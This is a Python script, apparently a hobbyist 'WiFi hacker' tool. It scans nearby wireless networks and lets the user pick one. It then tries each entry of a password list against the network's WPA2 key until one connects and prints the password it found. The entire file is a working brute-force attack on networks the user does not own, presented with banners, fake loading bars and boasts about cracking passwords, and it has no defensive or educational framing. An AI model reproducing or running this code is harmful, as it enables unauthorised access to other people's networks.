import os
import time

from pywifi import const, PyWiFi, Profile
from time import sleep
from winsound import Beep  # just for Windows
from colorama import Fore
import cowsay

# cowsay.dragon('WI-FI-HACKER-WITH-ERROR._.FIAT')

print('Let`s to WIFI Hacking !!!!')

os.system('cls')

os.system('cls')

logo = """
███████╗██████╗  ██████╗   ██████╗  ██████╗    ███████╗ ██╗   ██████╗  ████████╗  
██╔════╝██╔══██╗ ██╔══██╗ ██╔═══██╗ ██╔══██╗   ██╔════╝ ██║  ██╔═══██  ╚══██╔══╝ 
█████╗  ██████╔╝ ██████╔╝ ██║   ██║ ██████╔╝   █████╗   ██║  ██║   ██╗    ██║   instagram : error._.fiat 
██╔══╝  ██╔══██╗ ██╔══██╗ ██║   ██║ ██╔══██╗   ██╔══╝   ██║  ████████║    ██║    
███████╗██║  ██║ ██║  ██║ ╚██████╔╝ ██║  ██║   ██║      ██║  ██║   ██╚╗   ██║     
╚══════╝╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝  ╚═╝  ╚═╝   ╚═╝      ╚═╝ ██═╝    ██╝   ╚═╝      
                  _  __ _             _             _
        __      _(_)/ _(_)       __ _| |_ __ _  ___| | _____ _ __ 
        \ \ /\ / / | |_| |_____ / _` | __/ _` |/ __| |/ / _ \ '__|
         \ V  V /| |  _| |_____| (_| | || (_| | (__|   <  __/ |   
          \_/\_/ |_|_| |_|      \__,_|\__\__,_|\___|_|\_\___|_|   


  """

loading = 'Loading'
a25 = '    25% ==========                              >'
a50 = '    50% ====================                    >'
a75 = '    75% ==============================          >'
a100 = '    100% =======================================>'

print(Fore.RED+logo)

time.sleep(0.5)

print(loading)

time.sleep(3)

print(Fore.YELLOW+a25)

time.sleep(2)

print(Fore.YELLOW+a50)

time.sleep(4)

print(Fore.YELLOW+a75)

time.sleep(3)

print(Fore.YELLOW+a100)

time.sleep(0.7)

print(Fore.GREEN+'Connecting was successfully' , Fore.RED+'Now You Can crack WIFI password with Me')

time.sleep(3)

def scan():  # For Scan the area
    interface.scan()
    sleep(8)
    result = interface.scan_results()
    return result


def testwifi(ssid, password):
    interface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.connect(interface.add_network_profile(profile))
    sleep(1)
    if interface.status() == const.IFACE_CONNECTED:
        interface.remove_network_profile(profile)
        return True
    else:
        interface.remove_network_profile(profile)
        return False


wifi = PyWiFi()  # Wifi Object
interface = wifi.interfaces()[0]  # Select First Wireless Interface CARD

passlist = "dict.txt"  # Password List

print(Fore.YELLOW+"[?]", Fore.GREEN+"  Scanning ... ")
APs = scan()

for i in range(len(APs)):
    print("{} - {}".format(i + 1, APs[i].ssid))

index = int(input("\n>> "))
target = APs[index - 1]

os.system('cls')

time.sleep(1)

logo1 = """
███████╗██████╗  ██████╗   ██████╗  ██████╗    ███████╗ ██╗   ██████╗  ████████╗  
██╔════╝██╔══██╗ ██╔══██╗ ██╔═══██╗ ██╔══██╗   ██╔════╝ ██║  ██╔═══██  ╚══██╔══╝ 
█████╗  ██████╔╝ ██████╔╝ ██║   ██║ ██████╔╝   █████╗   ██║  ██║   ██╗    ██║    
██╔══╝  ██╔══██╗ ██╔══██╗ ██║   ██║ ██╔══██╗   ██╔══╝   ██║  ████████║    ██║    
███████╗██║  ██║ ██║  ██║ ╚██████╔╝ ██║  ██║   ██║      ██║  ██║   ██╚╗   ██║     
╚══════╝╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝  ╚═╝  ╚═╝   ╚═╝      ╚═╝ ██═╝    ██╝   ╚═╝        """

print(logo1)

for password in open(passlist):
    password = password.strip("\n")
    print("[ Ok ]", " Testing : {}".format(password))
    if testwifi(target.ssid, password):  # Test for connection using password
        Beep(700, 500)  # Boooooghhh (just for windows)
        Beep(1000, 500)  # BOOOOOOGHHHHHHH :|  (just for windows)
        print(Fore.LIGHTRED_EX+"-" * 30)
        print(Fore.LIGHTGREEN_EX+"PASSWORD : {}".format(password))
        print(Fore.LIGHTRED_EX+"-" * 30)
        break

input()